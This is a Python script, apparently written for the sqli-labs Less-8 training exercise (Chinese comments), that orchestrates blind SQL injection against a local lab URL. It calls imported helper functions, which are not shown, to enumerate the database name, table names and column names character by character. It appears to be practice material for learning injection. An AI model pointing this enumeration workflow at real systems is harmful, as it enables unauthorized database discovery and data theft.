from Databases import GetDBNameLen, GetDBName
from Tables import GetTableNameLen, GetTableName, GetTableCount
from Field import GetCluName, GetCluCount, GetCluNameLen

# 整合一下三大块的功能

def GetDatabase(main_url):
    db_name_len = GetDBNameLen(main_url)
    print("$ 数据库名长度为" + str(db_name_len) + "\n")

    db_name = GetDBName(main_url, db_name_len)
    print("$ 数据库名为" + db_name + "\n")

    return db_name


def GetTables(main_url, DBName):
    table_list = []          # 将所有查询到的表的名称放在这个列表里
    table_count = GetTableCount(main_url, DBName)      # 表的数量
    print("$ " + DBName + "数据库里有" + str(table_count) + "个表\n")
    for table in range(table_count):
        table_name_len = GetTableNameLen(main_url, DBName, table+1)
        print("$ 表名称长度为" + str(table_name_len) + "\n")

        table_name = GetTableName(main_url, DBName, table_name_len, table+1)
        print("$ 表名为" + table_name + "\n")

        table_list.append(table_name)
    return table_list

def GetFields(main_url, DBName, TableNames):
    fields = []  # 存放所有已查询到的字段
    for table in TableNames:
        print("表"+table+"下的字段")
        field_count = GetCluCount(main_url, DBName, table) # 当前表下字段的数量
        for field in range(field_count):
            field_name_len = GetCluNameLen(main_url, DBName, table, field+1)
            clu_name = GetCluName(main_url, DBName, table, field_name_len, field+1)
            print(clu_name)
            fields.append(clu_name)
    return fields


if __name__ == '__main__':
    main_url = "http://192.168.3.99/sqli-labs/Less-8/"  # 注入的地址
    # 1. 获取sqli-less8所在的数据库
    databasename = GetDatabase(main_url)
    print(databasename)
    # 2. 获取数据库下的表
    tables = GetTables(main_url, databasename)
    print(tables)
    # 3. 获取数据表下的字段
    fields = GetFields(main_url, databasename, tables)
    print(fields)
    #
    # clu_count = GetCluCount(main_url, db_name, table_name)
    # print(db_name + "数据库的" + table_name + "数据表有%d个字段" % clu_count + "\n")
    #
    # clu_name_len = GetCluNameLen(main_url, db_name, table_name, 1)
    # print(db_name + "数据库的" + table_name + "数据表的第一个字段长为%d" % clu_name_len + "\n")
    #
    # clu_name = GetCluName(main_url, db_name, table_name, clu_name_len, 1)
    # print(db_name + "数据库的" + table_name + "数据表的第一个字段为" + clu_name + "\n")


